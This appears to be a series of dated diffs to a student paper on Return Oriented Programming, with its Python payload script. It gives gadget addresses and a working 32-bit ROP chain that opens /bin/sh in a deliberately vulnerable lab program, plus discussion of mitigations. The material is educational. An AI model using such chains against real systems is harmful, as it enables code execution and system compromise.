+For that we search for a \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations.~\cite{ropsla} The following example writes the value in \Verb+ecx+ to where \Verb+eax+ points to: \bltInlineVerb{pop ecx ; pop eax ; mov dword ptr [eax], ecx}
 \paragraph{arithmetics, boolean algebra}
-Arithmetic operations like \Verb+add+, \Verb+sub+, \Verb+inc+, \Verb+xor+, \Verb+or+, and can be useful to bring registers into our desired state.
-For that we search for the corresponding gadget with the required operands.
+Arithmetic operations like \Verb+add+, \Verb+sub+, \Verb+inc+, \Verb+xor+, \Verb+or+, and can be useful to bring registers into our desired state.~\cite{ropsla} For that we search for the corresponding gadget with the required operands.
 For example \Verb+xor+ can be used to clear a register or copy its contents.
@@
 \paragraph{int 0x80}
-\Verb+int+ stand for an interrupt, the interrupt \Verb+0x80+ causes a system call to be executed.
+\Verb+int+ stands for interrupt, the interrupt \bltInlineVerb{int 0x80} causes a system call to be executed.
 System calls are kernelspace programs/operations that require higher privileges than what is available in a userspace program.
 Examples for system calls include io and \Verb+execve+ which allows to execute arbitary programs.
-In combination with \Verb+pop+, \Verb+mov+ and other instructions we can specify the concrete system call.
-One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files, it can be called with the argument \Verb+/bin/sh+.
+In combination with \Verb+pop+, \Verb+mov+ and other instructions we can specify the concrete system call.~\cite{ropsla} One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files, it can be called with the argument \Verb+/bin/sh+.
 This will be demonstrated in~\cref{sec:attack}
@@
 \end{itemize}
-for all of these regular expressions i was able to find at least a few suitable candidates.
+for all of these regular expressions there were gadgets for the given program in~\cref{sec:attack}.
 If there are no results the amount of possible characters before or after the gadget can be increased until results show up.
 It is however desirable to have gadgets with as few and noninterfering instructions as possible, if this is accomplished we can almost use the instructions we found like in assembly.
-Gadgets which do multiple things at once however can mess up the desired state and break the payload so it is important to thoroughly analyze the gadgets before using them.
+Gadgets which do multiple things at once however can mess up the desired state and break the payload so it is important to thoroughly analyze the gadgets before generating the payload.
 
@@
 \subsection{Stack}
-The following graphic is an illustration of how the stack changes when injecting the payload.
+The following graphic~\cref{fig:stack} is an illustration of how the stack changes when injecting the payload.
 The buffer first has to be filled.
@@
   \caption{The stack when injecting the payload}
-  \label{fig:mesh1}
+  \label{fig:stack}
 \end{figure}
@@
 For the example in this paper we want to open a shell, for that the simplest way is to execute an execve system call.
-The following program state~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.~\cite{pixis}
+The following program state~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.~\cite{pixis}~\cite{proggen-rop}
 \begin{figure}[h]

### 2023-02-16 paper.tex
changes

@@
 \end{figure}
-\subsection{ROP Chain}
-
+\subsection{ROP Runtime Behaviour}
+The following graphic~\cref{fig:executionatruntime} illustrates how the gadgets get executed once the instruction pointer \bltInlineVerb{eip} points to the ret in main.
+\begin{figure}[h]
+  \centering
+  \includegraphics[width=0.95\textwidth]{Ropchaineffect.png}
+  \caption{The stack when injecting the payload}
+  \label{fig:executionatruntime}
+\end{figure}
 \section{Attack}

### 2023-02-16 paper.tex
changes

@@
 Though, then the payload only worked when filling the buffer with 24 Bytes.
-\begin{figure}[h]
+\begin{figure}[h!]
   \centering
@@
 The following graphic~\cref{fig:executionatruntime} illustrates how the gadgets get executed once the instruction pointer \bltInlineVerb{eip} points to the ret in main.
-\begin{figure}[h]
+\begin{figure}[h!]
   \centering
@@
   \item Search gadgets for instructions
-  \item Determine how many bytes are needed to override the base pointer \Verb+ebp+
+  \item Determine how many words are needed to override the base pointer \Verb+ebp+
   \item Determine position of a writable data segment
@@
 \bltCode{pack.py}{python}{How to use struct.pack}{howtopack}
-
+\subsection{Payload}
+From all the previous steps the payload got constructed using python~\cref{code:payloadbinsh}.
+\bltCode{payload.py}{python}{Payload to open /bin/sh}{code:payloadbinsh}
 \section{Results}
@@
 \section{Protection}
-Luckily we had to disable several security mechanisms to make this attack possible, especially
+\paragraph{Stack canaries}
+Stack canaries are one of the most effective approaches against ROP, they are enabled by default and prevent most forms of buffer overflows, however, stack canaries can be based on a small entropy pool and can therfore be bruteforced with an effort significantly smaller than regular bruteforcing.
+Depending on the target it can still be profitable and possible to bruteforce it even with a big entropy pool and high randomness.
+\paragraph{NX}
+The activation of the NX bit has no effect on ROP since the program never executes code outside the segments marked with the \bltInlineVerb{CODE} flag like in a classical stack overflow attack.
+\paragraph{ASLR}
+\paragraph{PIE}
 

### 2023-02-16 payload.py

@@ -1,7 +1,7 @@
 from struct import pack
-import os
 data = 0x080e5020
 xor_eax_eax = 0x08050a08 # xor eax, eax ; ret
+xor_edx_edx = 0x0807b179 # xor edx, edx ; mov eax, edx ; ret
 pop_eax = 0x080ac76a # pop eax ; ret
 pop_ebx = 0x08049022 # pop ebx ; ret
 pop_ecx = 0x08054f5b # pop ecx ; add al, 0xf6 ; ret
@@ -9,45 +9,35 @@ pop_edx = 0x0808b285 # pop edx ; xor eax, eax ; pop edi ; ret
 inc_eax = 0x0809d0ae # inc eax ; ret
 int_80 = 0x080499b2 # int 0x80
 mov_edx_eax = 0x08080742 # mov dword ptr [edx], eax ; ret
-xor_edx_edx = 0x0807b179 # xor edx, edx ; mov eax, edx ; ret
 filler = 0x11111111
-# Padding goes here
-p = bytes('AAAA' * 4 + 'BBBB' * 1, 'ascii')
+
+p = bytes('AAAA' * 4 + 'BBBB' * 1, 'ascii') # Padding + EBP
  
 p += pack('<I', pop_edx) # write address of .data into edx
 p += pack('<I', data)
 p += pack('<I', filler)
 p += pack('<I', pop_eax) # write /bin into eax
 p += bytes('/bin', 'ascii')
-p += pack('<I', mov_edx_eax) # mov to .data
+p += pack('<I', mov_edx_eax) # mov /bin to .data
 p += pack('<I', pop_edx) # address of .data + 4 into edx
 p += pack('<I', data + 4)
 p += pack('<I', filler)
 p += pack('<I', pop_eax) # //sh into eax
 p += bytes('//sh', 'ascii')
-p += pack('<I', mov_edx_eax) # mov to .data
+p += pack('<I', mov_edx_eax) # mov //sh to .data + 4
 p += pack('<I', pop_edx) # address of .data + 8 into edx
 p += pack('<I', data + 8)
 p += pack('<I', filler)
 p += pack('<I', xor_eax_eax) # clear eax
 p += pack('<I', mov_edx_eax) # write null after /bin/sh
-p += pack('<I', pop_ebx)
+p += pack('<I', pop_ebx) # write address of string that points to program into ebx
 p += pack('<I', data)
[…]

### 2023-02-17 paper.tex
changes

@@
 The following program is the target of our attack, it uses a command line argument to provide the payload and \Verb+strcpy+ for the buffer overflow, overwriting the return address after the 8 Byte buffer.
-Using vulnerable input functions also works though.
+It is also possible to perform vulnerable input functions like \bltInlineVerb{scanf}.
 \bltCode{vuln.c}{c}{The Target Program}{thetargetprogram}
@@
 However, it is possible to determine the address of the dynamically linked library at runtime and adding an offset for each gadget to this address.
-This has been described by Saif El-Sherei~\cite{el-sherei} but will not be further discussed in this paper
+This has been described by Saif El-Sherei~\cite{el-sherei} but will not be further discussed in this paper.
 \bltCommand{compilation.sh}{The compliation command}{thecompilationcommand}
@@
 \paragraph{Goal and abstract payload}
-After specifying the goal and possibly simplifying it we have to write a list of instructions and arguments that achieve the goal, for this its favorable to directly use the format of the final payload except for using instructions instead of addresses as this will then allow to simply insert the found gadgets into this abstract payload.
+After specifying the goal and possibly simplifying it we have to write a list of instructions and arguments that achieve the goal, for this it is favorable to directly use the format of the final payload except for using instructions instead of addresses as this will then allow to simply insert the found gadgets into this abstract payload.
 For the example in this paper we want to open a shell, for that the simplest way is to execute an execve system call.
@@
 After injecting the generated payload from \cref{sec:attack} as a command line argument the program opened a shell from which we can use privilege escalation techniques in order to completely compromise the system.
-The only compiler options that had to be activated were PIE and stack canaries.
+\begin{figure}[h]
+  \centering
+  \includegraphics[width=0.95\textwidth]{ROPdone.png}
+  \caption{Shell Opened iwith ROP}
+  \label{fig:success}
+\end{figure}
+The only compiler features that had to be disabled were PIE and stack canaries.
 It is likely that there are systems still in use today which are vulnerable to this kind of attack.
@@
 \paragraph{ASLR}
-The information about wether or not ROP can be applied to systems with ASLR enabled is inconsistent.
-In the run with PIE and stack canaries disabled the attack still worked even with \Verb+/proc/sys/kernel/randomize_va_space+ set to \Verb+2+, meaning full randomization of the different segments like header, libraries and stack.
-This is probably due to PIE
+The information wether ROP works with ASLR enabled is inconsistent.
+While trying this attack with \bltInlineVerb{/proc/sys/kernel/randomize_va_space} set to \bltInlineVerb{2} meaning full randomization the attack still seemed to work.
+The inconsistent information probably arises due to different approaches being used.
+With executables that have PIE enabled ROP is still possible but only with ASLR disabled.
+With the compiler options used for this example PIE is disabled and ASLR seems to have no effect on the exploit.
+This is because
 

### 2023-02-17 paper.tex
changes

@@
 With the compiler options used for this example PIE is disabled and ASLR seems to have no effect on the exploit.
-This is because
+This is because the ASLR settings \Verb+1+ and \Verb+2+ only randomize shared libraries and PIE binaries~\cite{rny}, since the program has been compiled with the \bltInlineVerb{-static} option, which implicitly compiles the program to not be position independent.
 
@@
 \paragraph{ASLR}
+ASLR is a good protection against ROP since libraries and code locations get randomized each time the program is run. 32 Bit binaries only use 16 Bit for ASLR
 \paragraph{PIE}

### 2023-02-17 paper.tex
changes

@@
 BIBLIOGRAFIE NICHT VERGESSEN
-Return Oriented Programming is a type of buffer overflow attack that has been published in 2007 and ever since has become a widely known buffer overflow technique.
+Return Oriented Programming, abbreviated ROP is a type of buffer overflow attack that has been published in 2007 by Hovav Shacham~\cref{hshacham} and has become a widely known buffer overflow technique since.
 It has been developed to circumvent the NX-BIT protection that protects the stack from being executed.
-At the time of writing this paper modern techniques like Stack Carnaries and ASLR prevent these attacks from being practical but there are millions of running systems using old hard-, firm- and software that is possibly vulnerable to these kinds of buffer overflow attacks.
-Return Oriented Programming is based on chaining return addresses to code just before a return and therefor allowing almost arbitrary code segments to be chained.
+At the time of writing this paper modern techniques like stack carnaries and ASLR make these attacks hard and very time consuming on modern systems.
+That is not to say ASLR and stack canaries can not be broken by bruteforcing or side channels.
+Since there are millions of running systems with old hard-, firm- and software that is possibly vulnerable to these kinds of attacks it is still relevant to this day.
+The main idea in ROP is based on chaining return addresses to code just before a return and therefore allowing almost arbitrary cpu instructions to be chained.
 
 \section{Gadgets}
-\label{sec:main}
+\label{sec:gadgets}
 \paragraph{Introduction}
-On the x86 architecture the \Verb+ret+ instruction is defined to pop the return instruction pointer from the stack into the \Verb+eip+ register and redirect code execution to that memory address.
-By chaining addresses of instructions that end on a return and injecting them
-Gadgets are code segments that sit before a \Verb+ret+ instruction, these assembly instructions can be chained arbitrarily
+On the x86 architecture the \Verb+ret+ instruction is defined to pop the return instruction pointer from the stack into the \Verb+eip+ register and redirect code execution to that memory address.~\cite{retx86} A ROP gadget consists of a few instructions (usually 1-3) that end on a \bltInlineVerb{ret}.
 
@@
 A gadget can be found by searching for \Verb+0xC3+ Bytes in the program.
-The instructions before then represent the code we can use, for that we need the address of the gadget.
-It is possible this manually using tools like \Verb+objdump+, \Verb+hexdump+ or use one of the many tools available, to name a few there is \Verb+ropper+, \Verb+ROPgadget+ and \Verb+pwntools+.
-For this paper i will be using \Verb+ROPgadget+ since i found it easy to use and fast.
-\Verb+ROPgadget+ can be found in most package managers or can be downloaded directly from \url{https://github.com/JonathanSalwan/ROPgadget}.
-The gadgets can be extracted from the file using the following command~\cref{dumpallgadgets}.
-We can then use regular expressions to search for the gadgets that we need.
+The instructions before then represent the code code that can be executed by injecting the addresses of these instructions.
+It is possible to search for gadgets with \Verb+objdump+ or \Verb+hexdump+, however, the tools specifically made for finding ROP gadgets are really easy to use and provide lots of customizability and features for finding the required gadgets.
+To name a few ROP gadget tools there is \Verb+ropper+, \Verb+ROPgadget+ and \Verb+pwntools+.
+For this paper the software \Verb+ROPgadget+ has been employed since i found it easy to use.
+\bltInlineVerb{ROPgadget} can be found in most package managers or can be downloaded directly from \url{https://github.com/JonathanSalwan/ROPgadget}.
+The gadgets can be extracted from the file with the following command~\cref{dumpallgadgets}.
+We can then use regular expressions or ROPgadget directly to search for the required gadgets.
 \bltCommand{ropcommand.sh}{Exporting gadgets with ROPgadget}{dumpallgadgets}
@@
 It is clearly visible that many candidates for ROP can be found, even in a file with a relatively small size of 72 kB.
-Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state or they use a fixed return address.
-In most cases we can find suitable candidates using regular expressions though, this will be demonstrated later in this section.
+Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state.
+In most cases we can find suitable candidates using regular expressions, this will be demonstrated later in this section~\cref{subsec:filtering}.
 \paragraph{Overview of powerful gadgets}
@@
 \subsection{Filtering the gadgets}
+\label{subsec:filtering}
 \paragraph{Introduction}
-In order to find the gadgets we want we can use the tools directly or we can use regular expressions.
+In order to find the required gadgets we can use the tools directly or we can use regular expressions.
 In order to make this paper more general and easy to replicate i will be using regular expressions to find the desired gadgets.
 \paragraph{Gadgets and their corresponding Regular Expression}
-The following table describes what regex we can use to find the gadgets needed for the attack.
+The following table describes what regex we can use to find the gadgets required for the attack.
 \begin{itemize}
@@
 It is important to note that without any special compiler options the stack will be aligned in \bltInlineVerb{dword}'s, because of that the buffer has to be filled with 16 Bytes instead of 8 Bytes, this can be turned off with the option \bltInlineVerb{-mpreferred-stack-boundary=2}.
-Though, then the payload only worked when filling the buffer with 24 Bytes.
+Surprisingly the payload then only worked when filling the buffer with 24 Bytes.
 \begin{figure}[h!]
@@
 \subsection{ROP Runtime Behaviour}
-The following graphic~\cref{fig:executionatruntime} illustrates how the gadgets get executed once the instruction pointer \bltInlineVerb{eip} points to the ret in main.
+The following graphic~\cref{fig:executionatruntime} illustrates how the gadgets get executed once the instruction pointer \bltInlineVerb{eip} points to the \bltInlineVerb{ret} in \bltInlineVerb{main}.
 \begin{figure}[h!]
@@
 The following program is the target of our attack, it uses a command line argument to provide the payload and \Verb+strcpy+ for the buffer overflow, overwriting the return address after the 8 Byte buffer.
-It is also possible to perform vulnerable input functions like \bltInlineVerb{scanf}.
 \bltCode{vuln.c}{c}{The Target Program}{thetargetprogram}
@@
 \begin{enumerate}
-  \item Specify goal with required program state and instructions
-  \item Generate desired list of instructions and arguments (abstract payload/rop chain)
+  \item Specify attack, analyze necessary setup to be done.~\cref{par:goal}
   \item Extract gadgets using tools, e.g. ROPgadget~\cref{par:ropgadget}
-  \item Search gadgets for instructions
   \item Determine how many words are needed to override the base pointer \Verb+ebp+
   \item Determine position of a writable data segment
-  \item Generate payload using the gadgets according to the the abstract payload while making sure gadgets dont interfere with our desired program state.
-This step can be done using Python which we will show in a later section~\cref{howtopack}
+  \item Generate payload with the extracted gadgets based on the specification in step 1.
   \item Insert payload into target using a vulnerability
 \end{enumerate}
-\paragraph{Goal and abstract payload}
-After specifying the goal and possibly simplifying it we have to write a list of instructions and arguments that achieve the goal, for this it is favorable to directly use the format of the final payload except for using instructions instead of addresses as this will then allow to simply insert the found gadgets into this abstract payload.
-For the example in this paper we want to open a shell, for that the simplest way is to execute an execve system call.
+\paragraph{Specification and abstract payload}
+\label{par:goal}
+After specifying the goal and possibly simplifying it we have to determine the required program state.
+For the example in this paper we want to open a shell, for that the simplest way is to execute an \bltInlineVerb{execve} system call.
 The following program state~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.~\cite{pixis}~\cite{proggen-rop}
@@
 \end{figure}
-\paragraph{Extract and search gadgets}
+\paragraph{Extract gadgets}
+The gadgets can be extracted and like described in~\cref{sec:gadgets}
 \paragraph{Determine the padding}
@@
 \paragraph{Determine the address of a writable segment}
-There segments in a binary can be read only or writable.
+The segments in a binary can be read only or writable.
 It is possible to determine wether a segment is read only with \bltInlineVerb{objdump -h}.
 However, the following~\cref{command:finddatasegment} bash command can be used to find the address of the data segment.
+The data segment contains static and global variables.
+Since the target program does not have any global or static variables we can override this segment with arbitrary character sequences.
+In
 \bltCommand{objdump.sh}{Determine the Address of .data}{command:finddatasegment}
+\paragraph{Generating the payload}
+With this information we can start to construct the ideal payload, based on the description above and some knowledge about assembly the payload could take the following form. \\
+\bltInlineVerb{pop edx | 0x080e5020 | pop eax | "/bin" | pop edx | 0x080e5024 | "//sh" | xor eax, eax | pop edx | 0x080e5028 | mov dword ptr [edx], eax | pop ebx | 0x080e5020 | xor ecx, ecx | xor edx, edx | xor eax, eax | (inc eax) * 11 | int 0x80} \\
+When constructing this ideal payload it is important to know that some \bltInlineVerb{string.h} functions use the \bltInlineVerb{0x00} Byte to identify the end of a string.
+This means that depending on the implementation of the target it is important to not insert any \bltInlineVerb{0x00} Bytes into the payload otherwise the buffer does overflow fully.
+In most cases we can still write \bltInlineVerb{0x00} Bytes into registers or into memory.
+This can be accomplished by \bltInlineVerb{xor}'ing a register with itself and then copying that value into a register or into memory.
 \paragraph{struct.pack}

### 2023-02-17 paper.tex
changes

@@
 %%%% 5. KEYWORDS %%%%
-\keywords{ROP \and Return Oriented Programming \and Buffer Overflow \and Binary Exploitation}
+\keywords{ROP \and Return Oriented Programming \and ret2libc \and ret2lib \and ROP-Gadget \and Stack Overflow \and Buffer Overflow \and Binary Exploitation \and Cyber Security \and ASLR \and Address Space Layout Randomization \and NX \and DEP}
 
@@
 \begin{abstract}
-  In this paper we introduce the concept of Return Oriented Programming, how to apply it, how to protect against it and show a concrete attack.
+  Return Oriented Programming is a buffer overflow exploitation technique developed in 2007.
+Under certain circumstances it can provide arbitrary code execution on assembly level.
+Luckily the development of binary exploitation protections like stack canaries, bounds checking and ASLR made the effort required for developing an attack for that specific target and attacking the target too high to make it practicable in most cases, however, old soft-/hardware are still vulnerable and the mentioned protections have shown to be vulnerable themselves, with high enough reward ROP may be a devastating technique for black-hats.
 \end{abstract}
@@
 \section{Introduction}
-BIBLIOGRAFIE NICHT VERGESSEN
-Return Oriented Programming, abbreviated ROP is a type of buffer overflow attack that has been published in 2007 by Hovav Shacham~\cref{hshacham} and has become a widely known buffer overflow technique since.
+Return Oriented Programming, abbreviated ROP is a type of buffer overflow attack that has been published in 2007 by Hovav Shacham.~\cite{ropfirstpaper} and has become a widely known buffer overflow technique since.
 It has been developed to circumvent the NX-BIT protection that protects the stack from being executed.
@@
 \paragraph{mov}
-\Verb+mov+ allows us to write arbitrary values into memory.
-For that we search for a \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations.~\cite{ropsla} The following example writes the value in \Verb+ecx+ to where \Verb+eax+ points to: \bltInlineVerb{pop ecx ; pop eax ; mov dword ptr [eax], ecx}
+\Verb+mov+ allows us to read from memory, copy values from register to register and write arbitrary values into memory.
+In order to read from memory we have to search for a \bltInlineVerb{mov dword ptr <reg1>, [<reg2>]} instruction, we can then specify the memory address to read from in \bltInlineVerb{reg2}.
+In order to copy a value from register to register we have to search for a \bltInlineVerb{mov <reg1>, <reg2>} gadget.
+In order to write to memory we have to search for a \bltInlineVerb{mov dword ptr [<reg1>], <reg2>} instruction inside our gadgets, we can then specify the value in \bltInlineVerb{reg2} and the address in \bltInlineVerb{reg1}, given there is a way to modify both registers.
 \paragraph{arithmetics, boolean algebra}
-Arithmetic operations like \Verb+add+, \Verb+sub+, \Verb+inc+, \Verb+xor+, \Verb+or+, and can be useful to bring registers into our desired state.~\cite{ropsla} For that we search for the corresponding gadget with the required operands.
+Arithmetic operations like \Verb+add+, \Verb+sub+, \Verb+inc+ and \Verb+xor+ can be useful to bring registers into our desired state.~\cite{ropsla} For that we search for the corresponding gadget with the required operands.
 For example \Verb+xor+ can be used to clear a register or copy its contents.
@@
 In combination with \Verb+pop+, \Verb+mov+ and other instructions we can specify the concrete system call.~\cite{ropsla} One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files, it can be called with the argument \Verb+/bin/sh+.
-This will be demonstrated in~\cref{sec:attack}
+This will be demonstrated in~\cref{sec:attack}.
 \subsection{Filtering the gadgets}
@@
 In binary exploitation the letter \Verb+A+ is used for that most of the time, it has an easy to identify hexadecimal value of \bltInlineVerb{0x41}.
-It is important to note that without any special compiler options the stack will be aligned in \bltInlineVerb{dword}'s, because of that the buffer has to be filled with 16 Bytes instead of 8 Bytes, this can be turned off with the option \bltInlineVerb{-mpreferred-stack-boundary=2}.
-Surprisingly the payload then only worked when filling the buffer with 24 Bytes.
+It is important to note that without any special compiler options the stack will be aligned in \bltInlineVerb{dword}'s/16 Byte blocks.
+because of that the buffer has to be filled with more bytes than the buffer holds if $s \mod 16 \neq 0$ holds true, s being the buffer size in Bytes.
+\newpage
 \begin{figure}[h!]
@@
 The following graphic~\cref{fig:executionatruntime} illustrates how the gadgets get executed once the instruction pointer \bltInlineVerb{eip} points to the \bltInlineVerb{ret} in \bltInlineVerb{main}.
+Once this happens the execution gets redirected to the first gadget and executes the instructions in it.
+As soon as \bltInlineVerb{eip} points to the \bltInlineVerb{ret} in the 1st gadget the address of the 2nd gadget is \bltInlineVerb{pop}'d into \bltInlineVerb{eip} and execution continues there, from there the same thing happens again until execution reaches the end of the last gadget.
 \begin{figure}[h!]
@@
   \item Extract gadgets using tools, e.g. ROPgadget~\cref{par:ropgadget}
-  \item Determine how many words are needed to override the base pointer \Verb+ebp+
-  \item Determine position of a writable data segment
-  \item Generate payload with the extracted gadgets based on the specification in step 1.
-  \item Insert payload into target using a vulnerability
+  \item Determine how many words are needed to override the base pointer \Verb+ebp+~\cref{par:padding}
+  \item Determine position of a writable data segment~\cref{par:data}
+  \item Generate payload with the extracted gadgets based on the specification in step 1.~\cref{par:genthepayload}
+  \item Insert payload into target using a vulnerability~\cref{par:injthepayload}
 \end{enumerate}
+\subsection{The attack}
 \paragraph{Specification and abstract payload}
@@
 \paragraph{Extract gadgets}
-The gadgets can be extracted and like described in~\cref{sec:gadgets}
+The gadgets can be extracted like described in~\cref{sec:gadgets}
 \paragraph{Determine the padding}
+\label{par:padding}
 Compilers optimize stack alignment and without providing options to change that the simplest way to determine the padding required is to test the program until it crashes with a payload increasing by 1 word in each iteration.
@@
 \paragraph{Determine the address of a writable segment}
+\label{par:data}
 The segments in a binary can be read only or writable.
@@
 \paragraph{Generating the payload}
-With this information we can start to construct the ideal payload, based on the description above and some knowledge about assembly the payload could take the following form. \\
-\bltInlineVerb{pop edx | 0x080e5020 | pop eax | "/bin" | pop edx | 0x080e5024 | "//sh" | xor eax, eax | pop edx | 0x080e5028 | mov dword ptr [edx], eax | pop ebx | 0x080e5020 | xor ecx, ecx | xor edx, edx | xor eax, eax | (inc eax) * 11 | int 0x80} \\
-When constructing this ideal payload it is important to know that some \bltInlineVerb{string.h} functions use the \bltInlineVerb{0x00} Byte to identify the end of a string.
+\label{par:genthepayload}
+There are many ways to generate the payload, the most common and simple method is with pythons \bltInlineVerb{struct.pack} function.~\cite{proggen-rop} The following example~\cref{code:howtopack} illustrates how to generate a payload with \bltInlineVerb{pack}.
+\bltCode{pack.py}{python}{How to use struct.pack}{code:howtopack}
+Now that all requirements are met the payload can be constructed.
+\subparagraph{/bin//sh}
+The first step is to write \bltInlineVerb{/bin//sh} into the \bltInlineVerb{.data} segment.
+This implies the use of the \bltInlineVerb{mov} function.
+Ideally the registers used should either be \bltInlineVerb{eax}, \bltInlineVerb{ebx}, \bltInlineVerb{ecx} or \bltInlineVerb{edx} since these registers provide the easiest access, usually with multiple \bltInlineVerb{pop} gadgets in an executable.
+After checking the gadgets the following seemed like the best gadget: \bltInlineVerb{0x08080742 : mov dword ptr [edx], eax ; ret}.
+Locating the \bltInlineVerb{pop} instructions for these 4 registers was simple and yielded: \bltInlineVerb{0x080ac76a # pop eax ; ret}, \bltInlineVerb{0x08049022 # pop ebx ; ret}, \bltInlineVerb{0x08054f5b # pop ecx ; add al, 0xf6 ; ret} and \bltInlineVerb{0x0808b285 # pop edx ; xor eax, eax ; pop edi ; ret}.
+The 3rd gadget adds a number to the \bltInlineVerb{eax} register and the 4th gadget \bltInlineVerb{xor}'s it.
+For the sake of this attack this is not a problem since we can simply modify \bltInlineVerb{eax} last.
+The 4th gadget also \bltInlineVerb{pop}'s a value into \bltInlineVerb{edi} which does not interfere with this attack, it just means that we have to provide an arbitary word after the parameter for \bltInlineVerb{pop edx}.
+With these instructions it is possible to write \bltInlineVerb{"/bin//sh"} into the \bltInlineVerb{.data} segment.
+Once a string is written into memory it still needs to have a \bltInlineVerb{0x00} Byte added after it, that is because some \bltInlineVerb{string.h} functions use the \bltInlineVerb{0x00} Byte to identify the end of a string.
 This means that depending on the implementation of the target it is important to not insert any \bltInlineVerb{0x00} Bytes into the payload otherwise the buffer does overflow fully.
@@
 This can be accomplished by \bltInlineVerb{xor}'ing a register with itself and then copying that value into a register or into memory.
-\paragraph{struct.pack}
-\Verb+struct.pack+ is a Python function that allows to easily generate our desired payload from the raw bytes.
-Bash then allows to directly pipe the generated payload into our target.
-In order to generate the payload we first have to fill the buffer and override the EBP with arbitary values as seen in line 2~\cref{howtopack}.
-This is usually done using easily recognizable characters, using the letter \Verb+A+ for this is common.
-It has the hex value \Verb+0x41+, doing this allows then to spot the buffer in a debugger like \Verb+gdb+.
-So in this example we fill the buffer with 8 \Verb+A+'s and 4 \Verb+B+'s.
-After that it is time to insert the addresses of the gadgets and the arguments.
-This is done by calling pack with the double word (64 Bit) while specifying the endianness, converting that to a string and adding it to the string as seen in line 3~\cref{howtopack}.
-After the whole payload has been generated we can print it and use the output directly for running the buffer overflow attack as mentioned above.
-\bltCode{pack.py}{python}{How to use struct.pack}{howtopack}
-\subsection{Payload}
-From all the previous steps the payload got constructed using python~\cref{code:payloadbinsh}.
+In order to write a \bltInlineVerb{0x00} Byte after the string we can \bltInlineVerb{xor} the \bltInlineVerb{eax} register with \bltInlineVerb{0x08050a08 # xor eax, eax ; ret}.
+After that we simply have to copy it again.
+\subparagraph{Initializing the registers}
+As seen in~\cref{fig:stateforint} we first need to write the address of \bltInlineVerb{/bin//sh} into \bltInlineVerb{ebx}, this can simply be done with the \bltInlineVerb{pop ebx ; ret} gadget.
+Then we need to clear \bltInlineVerb{ecx} and \bltInlineVerb{edx}.
+For clearing \bltInlineVerb{edx} the gadget \bltInlineVerb{0x0807b179 # xor edx, edx ; mov eax, edx ; ret} is a good candidate, since it only modifies \bltInlineVerb{eax} apart from the desired effect.
+There were no \bltInlineVerb{xor ecx, ecx} or \bltInlineVerb{mov ecx, <reg>} gadgets that ended on a return so \bltInlineVerb{ecx} was just set to point at the null pointer after the \bltInlineVerb{/bin//sh} string, making the provided argument list empty.
+The last step to set up the \bltInlineVerb{execve} system call is to set \bltInlineVerb{eax} to \bltInlineVerb{11}/\bltInlineVerb{0x0B}.
+For that we can use the \bltInlineVerb{0x08050a08 # xor eax, eax ; ret} gadget from before to set \bltInlineVerb{eax} to \bltInlineVerb{0x00} and then increment it 11 times with \bltInlineVerb{0x0809d0ae # inc eax ; ret}.
+\subparagraph{Interrupt}
+In the end the \bltInlineVerb{0x080499b2 # int 0x80} interrupt gets called. If the state got initialized correctly \bltInlineVerb{/bin//sh} gets executed.
+\subparagraph{Constructing the payload}
+From all the previous steps the payload got constructed with python~\cref{code:payloadbinsh}.
+As seen in the example we can define all the addresses, gadgets and other parameters as variables and reuse them in the \bltInlineVerb{pack} calls, this way changing a gadget only requires one value to be changed.
+The different
 \bltCode{payload.py}{python}{Payload to open /bin/sh}{code:payloadbinsh}
+\paragraph{Injecting the payload}
+\label{par:injthepayload}
+How the payload gets injected depends on the target. For the example in this paper the payload can be injected using the following commands~\cref{command:injthepayload}.
+\bltCommand{inject.sh}{Injecting the payload}{command:injthepayload}
 \section{Results}
@@
 \end{figure}
-The only compiler features that had to be disabled were PIE and stack canaries.
-It is likely that there are systems still in use today which are vulnerable to this kind of attack.
+The only protections that had to be disabled were stack canaries and ASLR.
+It is likely that there are systems still in use today which are vulnerable to this kind of attack due to not having these protections or the protections themselves being attackable.
 Since it allows almost arbitrary code execution it is very important to identify these devices and patch or replace them.
@@
 The inconsistent information probably arises due to different approaches being used.
-With executables that have PIE enabled ROP is still possible but only with ASLR disabled.
+With executables that have PIE enabled ROP is still possible but only with ASLR disabled~\cite{el-sherei}.
 With the compiler options used for this example PIE is disabled and ASLR seems to have no effect on the exploit.
-This is because the ASLR settings \Verb+1+ and \Verb+2+ only randomize shared libraries and PIE binaries~\cite{rny}, since the program has been compiled with the \bltInlineVerb{-static} option, which implicitly compiles the program to not be position independent.
+This is because the ASLR settings \Verb+1+ and \Verb+2+ only randomize shared libraries and PIE binaries~\cite{rny}, since the program has been compiled with the \bltInlineVerb{-static} option, which implicitly compiles the program to not be position independent, ASLR is not being used, even when activated.
 
@@
 \paragraph{NX}
-The activation of the NX bit has no effect on ROP since the program never executes code outside the segments marked with the \bltInlineVerb{CODE} flag like in a classical stack overflow attack.
+The activation of the NX bit has no effect on ROP since the program never executes code outside the segments marked with the \bltInlineVerb{CODE} flag like in a classical stack overflow attack.~\cite{ropsla}
 \paragraph{ASLR}
-ASLR is a good protection against ROP since libraries and code locations get randomized each time the program is run. 32 Bit binaries only use 16 Bit for ASLR
-\paragraph{PIE}
-
-\section{Discussion}
-Sources:
-
-\bltInlineVerb{https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf}
-\bltInlineVerb{https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html}
+According to a paper by Hovav Shacham et al.
+ASLR is a good protection against ROP in 64 bit binaries assuming no side channel leakage since 40 bit are available for randomizations of the libraries and code locations, however, 32 Bit binaries only use 16 Bit for randomization.
+Because of that they were able to perform a buffer overflow attack like ret2libc on an Apache server with an average of 216 seconds.~\cite{aslr}
